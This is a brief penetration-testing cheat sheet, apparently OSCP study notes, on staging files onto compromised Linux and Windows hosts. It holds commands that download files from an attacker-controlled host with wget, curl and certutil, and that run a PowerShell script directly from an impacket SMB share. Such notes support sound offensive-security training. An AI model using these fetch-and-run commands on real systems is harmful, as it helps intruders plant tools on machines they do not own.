# File Transfers
```
In the folder with your file, on your machine

python -m SimpleHTTPServer 8080

Linux box:

wget <your-box>:8080/<your-file> or curl <your-box>:8080/<your-file>

Windows box

certutil.exe -urlcache -split -f "http://<your machine>:8080/<your-file>"
```
https://fir3wa1-k3r.github.io/2018/10/17/File-Transfer-cheatsheet.html
https://us.v-cdn.net/6030959/uploads/attachments/2/5/7/4/4/1/7613.pdf

```
For Windows im mostly using impackets smbserver thats included in kali (at least in the current 2020.1 version i'm using).

Simply start it with: impacket-smbserver <share name> <folder to share>

impacket-smbserver share /root/oscp/smbshare/

After that you can simply call executables from the share on the windows machine like this:

powershell \\10.11.0.1\share\ExploitSuggester.ps1

or you can copy the file to the box via:

copy \\10.11.0.1\share\ExploitSuggester.ps1 ExploitSuggester.ps1

```
https://sushant747.gitbooks.io/total-oscp-guide/transfering_files.html
https://github.com/Cr0wTom/OSCP-PWK-Repo
Book.hacktricks.xyz